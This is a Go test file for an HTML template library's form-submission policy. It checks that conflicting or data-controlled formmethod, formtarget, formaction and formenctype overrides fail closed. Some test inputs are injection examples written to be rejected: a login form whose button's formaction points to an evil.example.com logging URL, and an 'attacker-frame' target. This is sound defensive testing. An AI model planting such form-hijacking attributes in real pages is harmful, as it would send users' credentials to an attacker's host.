// Copyright 2024 The Go Authors. All rights reserved.
//
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file or at
// https://developers.google.com/open-source/licenses/bsd

package template

import (
	"bytes"
	"strings"
	"testing"
)

// TestFormSubmissionPolicy verifies that the form's action, submission method
// and target, and any button/input overrides form one consistent submission
// policy. Unknown or conflicting combinations fail template parsing closed,
// while ordinary static forms keep rendering unchanged.
func TestFormSubmissionPolicy(t *testing.T) {
	for _, test := range [...]struct {
		desc   string
		input  string
		output string
		err    string
	}{
		// Ordinary static forms must keep working unchanged.
		{
			desc:   "plain post form",
			input:  `<form method="post" action="/login"><input type="password" name="pw"><button type="submit">Go</button></form>`,
			output: `<form method="post" action="/login"><input type="password" name="pw"><button type="submit">Go</button></form>`,
		},
		{
			desc:   "default method form",
			input:  `<form action="/search"><input name="q"><button>Go</button></form>`,
			output: `<form action="/search"><input name="q"><button>Go</button></form>`,
		},
		{
			desc:   "explicit get form",
			input:  `<form method="get" action="/search"><button>Go</button></form>`,
			output: `<form method="get" action="/search"><button>Go</button></form>`,
		},
		{
			desc:   "uppercase method normalized",
			input:  `<form method="POST" action="/login"><button>Go</button></form>`,
			output: `<form method="POST" action="/login"><button>Go</button></form>`,
		},
		{
			desc:   "form outside element after closing tag",
			input:  `<form method="post" action="/login"></form><button formmethod="get">Go</button>`,
			output: `<form method="post" action="/login"></form><button formmethod="get">Go</button>`,
		},
		// Consistent overrides are allowed and render unchanged.
		{
			desc:   "matching formmethod on button",
			input:  `<form method="post" action="/login"><button formmethod="post">Go</button></form>`,
			output: `<form method="post" action="/login"><button formmethod="post">Go</button></form>`,
		},
		{
			desc:   "matching formmethod on input",
			input:  `<form method="post" action="/login"><input type="submit" formmethod="post"></form>`,
			output: `<form method="post" action="/login"><input type="submit" formmethod="post"></form>`,
		},
		{
			desc:   "matching formtarget",
			input:  `<form target="_blank" action="/open"><button formtarget="_blank">Go</button></form>`,
			output: `<form target="_blank" action="/open"><button formtarget="_blank">Go</button></form>`,
		},
		{
			desc:   "formtarget allowed when form has no target",
			input:  `<form action="/open"><button formtarget="_self">Go</button></form>`,
			output: `<form action="/open"><button formtarget="_self">Go</button></form>`,
		},
		// Conflicting method overrides fail closed: a sensitive POST must not be
		// downgraded to GET and have its fields moved into the URL.
		{
			desc:  "button downgrades post to get",
			input: `<form method="post" action="/login"><button formmethod="get">Go</button></form>`,
			err:   `conflicts with the enclosing form's method "post"`,
		},
		{
			desc:  "input downgrades post to get",
			input: `<form method="post" action="/login"><input type="submit" formmethod="get"></form>`,
			err:   `conflicts with the enclosing form's method "post"`,
		},
		{
			desc:  "invalid formmethod value",
			input: `<form method="post" action="/login"><button formmethod="delete">Go</button></form>`,
			err:   `must be one of "get" or "post"`,
		},
		{
			desc:  "invalid form method value",
			input: `<form method="put" action="/login"></form>`,
			err:   `must be one of "get" or "post"`,
		},
		// Conflicting targets fail closed.
		{
			desc:  "formtarget conflicts with form target",
			input: `<form target="_self" action="/login"><button formtarget="_blank">Go</button></form>`,
			err:   `conflicts with the enclosing form's target "_self"`,
		},
		{
			desc:  "named form target rejected",
			input: `<form target="attacker-frame" action="/login"></form>`,
			err:   `must be one of "_blank" or "_self"`,
		},
		{
			desc:  "named formtarget rejected",
			input: `<form action="/login"><button formtarget="attacker-frame">Go</button></form>`,
			err:   `must be one of "_blank" or "_self"`,
		},
		// formaction and formenctype would change the effective request, so they
		// are rejected inside forms.
		{
			desc:  "button formaction rejected",
			input: `<form method="post" action="/login"><button formaction="https://evil.example.com/log">Go</button></form>`,
			err:   `"formaction" attribute of a "button" element overrides the enclosing form's submission policy`,
		},
		{
			desc:  "input formaction rejected",
			input: `<form method="post" action="/login"><input type="image" formaction="/elsewhere"></form>`,
			err:   `"formaction" attribute of a "input" element overrides the enclosing form's submission policy`,
		},
		{
			desc:  "button formenctype rejected",
			input: `<form method="post" action="/login"><button formenctype="text/plain">Go</button></form>`,
			err:   `"formenctype" attribute of a "button" element overrides the enclosing form's submission policy`,
		},
		{
			desc:  "input formenctype rejected",
			input: `<form method="post" action="/login"><input type="image" formenctype="multipart/form-data"></form>`,
			err:   `"formenctype" attribute of a "input" element overrides the enclosing form's submission policy`,
		},
		{
			desc:   "static form enctype allowed",
			input:  `<form method="post" enctype="multipart/form-data" action="/login"><button>Go</button></form>`,
			output: `<form method="post" enctype="multipart/form-data" action="/login"><button>Go</button></form>`,
		},
		{
			desc:  "static bad form enctype rejected",
			input: `<form method="post" enctype="weird/encoding" action="/login"></form>`,
			err:   `the "enctype" attribute of a "form" element must be one of`,
		},
		{
			desc:  "dynamic form enctype enum enforced",
			input: `<form method="post" enctype="{{ .Enc }}" action="/login"></form>`,
			err:   `expected one of the following strings: ["application/x-www-form-urlencoded" "multipart/form-data" "text/plain"]`,
		},
		{
			desc:   "dynamic form enctype valid",
			input:  `<form method="post" enctype="{{ .EncOK }}" action="/login"></form>`,
			output: `<form method="post" enctype="text/plain" action="/login"></form>`,
		},
		// Data-controlled form policies are constrained by enum sanitizers, but any
		// override inside such a form cannot be validated statically and fails closed.
		{
			desc:   "dynamic form method accepted without overrides",
			input:  `<form method="{{ .Method }}" action="/login"><button>Go</button></form>`,
			output: `<form method="get" action="/login"><button>Go</button></form>`,
		},
		{
			desc:   "dynamic form target accepted without overrides",
			input:  `<form target="{{ .Target }}" action="/login"></form>`,
			output: `<form target="_blank" action="/login"></form>`,
		},
		{
			desc:  "dynamic form method rejects bad enum",
			input: `<form method="{{ .BadMethod }}" action="/login"></form>`,
			err:   `expected one of the following strings: ["get" "post"]`,
		},
		{
			desc:  "override under dynamic form method fails closed",
			input: `<form method="{{ .Method }}" action="/login"><button formmethod="get">Go</button></form>`,
			err:   `cannot be validated against the enclosing "form" element because its submission policy is not statically known`,
		},
		{
			desc:  "override under dynamic form target fails closed",
			input: `<form target="{{ .Target }}" action="/login"><button formtarget="_blank">Go</button></form>`,
			err:   `cannot be validated against the enclosing "form" element because its submission policy is not statically known`,
		},
		{
			desc:  "formaction under dynamic form method fails closed",
			input: `<form method="{{ .Method }}" action="/login"><button formaction="/x">Go</button></form>`,
			err:   `cannot be validated against the enclosing "form" element because its submission policy is not statically known`,
		},
		{
			desc:  "dynamic formmethod rejected",
			input: `<form method="post" action="/login"><button formmethod="{{ .Method }}">Go</button></form>`,
			err:   `actions must not determine the "formmethod" attribute`,
		},
		{
			desc:  "dynamic formtarget rejected",
			input: `<form action="/login"><button formtarget="{{ .Target }}">Go</button></form>`,
			err:   `actions must not determine the "formtarget" attribute`,
		},
		{
			desc:  "dynamic formaction rejected",
			input: `<form method="post" action="/login"><button formaction="{{ .URL }}">Go</button></form>`,
			err:   `actions must not determine the "formaction" attribute`,
		},
		// The dynamic formmethod enum sanitizer still rejects non-enum values even
		// when the element is not associated with a form.
		{
			desc:  "dynamic formmethod outside form rejected by enum",
			input: `<button formmethod="{{ .BadMethod }}">Go</button>`,
			err:   `expected one of the following strings: ["get" "post"]`,
		},
		{
			desc:   "dynamic formmethod outside form accepts valid enum",
			input:  `<button formmethod="{{ .Method }}">Go</button>`,
			output: `<button formmethod="get">Go</button>`,
		},
		// Branching inside a form policy attribute makes the policy non-static, even
		// when all branches render the same value. Overrides then fail closed.
		{
			desc:   "branching method without override renders",
			input:  `<form method="{{if .T}}post{{else}}post{{end}}" action="/login"><button>Go</button></form>`,
			output: `<form method="post" action="/login"><button>Go</button></form>`,
		},
		{
			desc:  "branching method with override fails closed",
			input: `<form method="{{if .T}}post{{else}}post{{end}}" action="/login"><button formmethod="post">Go</button></form>`,
			err:   `cannot be validated against the enclosing "form" element because its submission policy is not statically known`,
		},
		{
			desc:  "branching target with override fails closed",
			input: `<form target="{{if .T}}_blank{{else}}_blank{{end}}" action="/login"><button formtarget="_blank">Go</button></form>`,
			err:   `cannot be validated against the enclosing "form" element because its submission policy is not statically known`,
		},
		{
			desc:  "branching method with formaction fails closed",
			input: `<form method="{{if .T}}post{{else}}post{{end}}" action="/login"><button formaction="/x">Go</button></form>`,
			err:   `cannot be validated against the enclosing "form" element because its submission policy is not statically known`,
		},
		{
			desc:  "range inside method with override fails closed",
			input: `<form method="{{range .Items}}post{{end}}" action="/login"><button formmethod="post">Go</button></form>`,
			err:   `cannot be validated against the enclosing "form" element because its submission policy is not statically known`,
		},
	} {
		t.Run(test.desc, func(t *testing.T) {
			tmpl, err := New("").Parse(stringConstant(test.input))
			if err != nil {
				t.Fatalf("parse failed: %v", err)
			}
			var b bytes.Buffer
			err = tmpl.Execute(&b, map[string]interface{}{
				"Method":    "get",
				"BadMethod": "delete",
				"Target":    "_blank",
				"URL":       "https://evil.example.com/log",
				"Enc":       "weird/encoding",
				"EncOK":     "text/plain",
				"T":         true,
				"Items":     []int{1},
			})
			if test.err != "" {
				if err == nil {
					t.Fatalf("expected error containing %q, got output %q", test.err, b.String())
				}
				if !strings.Contains(err.Error(), test.err) {
					t.Fatalf("error %q does not contain %q", err.Error(), test.err)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected execution error: %v", err)
			}
			if got := b.String(); got != test.output {
				t.Fatalf("rendered output:\n\tgot  %q\n\twant %q", got, test.output)
			}
		})
	}
}
